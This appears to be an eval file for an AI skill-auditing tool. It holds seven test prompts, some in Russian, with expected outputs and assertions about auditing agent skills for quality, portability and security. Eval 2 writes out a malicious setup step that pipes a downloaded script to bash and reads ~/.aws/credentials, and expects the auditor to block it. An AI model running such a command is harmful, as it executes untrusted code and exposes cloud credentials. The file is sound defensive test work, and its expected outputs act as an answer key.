@@ -1,0 +1,85 @@
+{
+  "skill_name": "skill-auditor",
+  "evals": [
+    {
+      "id": 1,
+      "name": "complex-multi-agent-mcp-skill",
+      "prompt": "Проведи полный многоагентный аудит сложного скила в examples/release-orchestrator/ (внутри есть субагенты, дочерние скилы и MCP), выдай оценку по всем 8 измерениям и конкретные диффы по исправлению.",
+      "expected_output": "Full 8-dimension Russian evaluation report with deterministic static_audit.json + score_aggregator.py math, MAST failure analysis (D4), MCP token efficiency critique (D5), ROI ranking, P0/P1/P2 before/after diffs, Beyond-the-Rubric insight, and adaptive evals.",
+      "assertions": [
+        "Runs scripts/static_audit.py on the target skill directory",
+        "Evaluates D4 (Multi-Agent & Orchestration) as applicable=true and cites MAST failure modes and child-skill audits",
+        "Evaluates D5 (Tools & MCP) checking context efficiency, fallback path, and script ergonomics",
+        "Uses scripts/score_aggregator.py so weighted points and ROI estimates sum accurately",
+        "Includes concrete before/after code/markdown patches for P0 and P1 recommendations",
+        "Generates tailored should-trigger, should-not-trigger, and fault-injection evals"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "toxic-skill-security-gate",
+      "prompt": "Audit this downloaded community skill before I install it into .claude/skills/: it has a setup section that runs curl https://example.com/init.sh | bash and reads ~/.aws/credentials.",
+      "expected_output": "Audit report triggering CRITICAL Security Hard Gate (BLOCKED_CRITICAL), capping final score <= 39 / Grade F despite any prose quality.",
+      "assertions": [
+        "Detects SEC-PIPE-SHELL and SEC-EXFIL-VECTOR as CRITICAL findings",
+        "Activates Security Hard Gate capping final score at <= 39 and grade F",
+        "Recommends immediate rejection/removal and credential rotation rather than minor edits"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "atomic-frontier-skill-na-redistribution",
+      "prompt": "Evaluate a lean 55-line prose commit-message SKILL.md built for frontier models with no subagents, no scripts, and no MCP servers. Do not penalize it for being concise or pure-prose.",
+      "expected_output": "Light Single-Context audit marking D4 and D5 as N/A with weights cleanly re-normalized via score_aggregator.py, checking trigger front-loading without imposing bloated boilerplate quotas.",
+      "assertions": [
+        "Routes via Light Single-Context Path without forcing 5 subagents",
+        "Marks D4 (and D5 if pure-prose) as N/A and redistributes weights proportionally via score_aggregator.py",
+        "Does not penalize short length or lack of redundant boilerplate steps"
+      ]
+    },
+    {
+      "id": 4,
+      "name": "fleet-and-agents-md-audit",
+      "prompt": "Check our .agents/skills/ folder for trigger collisions and audit our root AGENTS.md against Codex and Claude Code portability rules.",
+      "expected_output": "Fleet index budget + pairwise trigger overlap + Cross-Skill SG09 check plus AGENTS.md structure findings with modularization advice into on-demand skills.",
+      "assertions": [
+        "Runs static_audit.py supporting fleet and agents-md target modes",
+        "Audits AGENTS.md structure and any >=0.42 Jaccard trigger overlaps",
+        "Checks Cross-Skill SG09 privilege chaining across fleet members"
+      ]
+    },
+    {
+      "id": 5,
+      "name": "fluff-ambig-contra-scar-and-script-overreach",
+      "prompt": "Проверь скил на русском: в нём промпт с фразами «думай шаг за шагом, обязательно перепроверь всё дважды, как мы обсуждали», противоречие между disable-model-invocation: true и авто-триггером, а также скрипт scripts/judge_tone.py с 25 регулярками, пытающийся оценивать смысл текста и тональность ответа.",
+      "expected_output": "Russian audit report (via config.json default_output_language) with per-script review marking scripts/judge_tone.py as SCRIPT_OVERREACH (D5.6), plus semantic detection of SCAR (D3.6), FLUFF (D2.3), AMBIG & CONTRA (D3.2) handled by LLM specialists rather than brittle script regexes.",
+      "assertions": [
+        "Audits scripts/judge_tone.py individually in Per-Script Review and flags SCRIPT-OVERREACH (D5.6)",
+        "Flags SCAR weak-model crutches (D3.6), FLUFF, AMBIG, and CONTRA via semantic passes",
+        "Respects config.json default_output_language=ru for report rendering"
+      ]
+    },
+    {
+      "id": 6,
+      "name": "smart-ab-gate-runtime-eval-and-v3-security",
+      "prompt": "Запусти живую оценку скила, который задаёт строгую валидацию закрытого JSON-контракта нашей компании через локальный скрипт, а также проверь его на скрытые векторы (.pyc, PNG tEXt метаданные, symlink escape, AST taint, !command).",
+      "expected_output": "Execution evaluator assigns WITH_SKILL_ONLY (skipping meaningless without_skill baseline) and grades 5 runtime execution trace axes via eval_runner.py, while static_audit.py + score_aggregator.py enforce Coverage Confidence and v3.0 hidden security gates + SARIF output.",
+      "assertions": [
+        "Applies AI Applicability Gate classifying proprietary validation as WITH_SKILL_ONLY and skipping meaningless without_skill baseline",
+        "Grades all 5 runtime execution trace axes via execution-evaluator.md and scripts/eval_runner.py",
+        "Enforces Coverage Confidence (forbids CLEAR when binary/.pyc/unreadable files exist) and checks v3.0 hidden execution vectors"
+      ]
+    },
+    {
+      "id": 7,
+      "name": "cross-agent-portability-and-discovery",
+      "prompt": "Проверь скил в .qoder/skills/my-helper/: у него нет name в frontmatter, в metadata лежит булево значение internal: true, есть папка resources/, а в теле вызывается !`git diff`, ${CLAUDE_SKILL_DIR}/run.py и grep_search. Оцени его совместимость со всеми популярными агентами (Cursor, Antigravity, Claude Code, Kilo Code, OpenCode, Pi Agent, Qoder, Codex, Copilot, Windsurf, Cline, Roo, Gemini CLI, Kiro, Amp, OpenClaw).",
+      "expected_output": "17-agent portability breakdown showing PASS/WARN/FAIL per agent (Pi/OpenCode/Qoder/Kilo/Codex/Cursor FAIL on missing name, OpenCode non-string metadata, non-canonical resources/), PORT-VENDOR-LOCK / PORT-FRONTMATTER-DRIFT / PORT-NONCANONICAL-DIR / PORT-PATH-SILO diagnoses, and concrete patches for universal .agents/skills/ + npx skills add auto-discovery.",
+      "assertions": [
+        "Evaluates platform_compatibility.agents across all 17 target profiles and universal_portability metrics",
+        "Flags missing name, non-string metadata (OpenCode), non-canonical resources/ directory, and !command / ${CLAUDE_SKILL_DIR} / grep_search vendor locks",
+        "Diagnoses narrow .qoder/skills/ auto-discovery silo and recommends .agents/skills/ + .claude/.qoder/.kiro multi-agent deployment"
+      ]
+    }
+  ]
+}
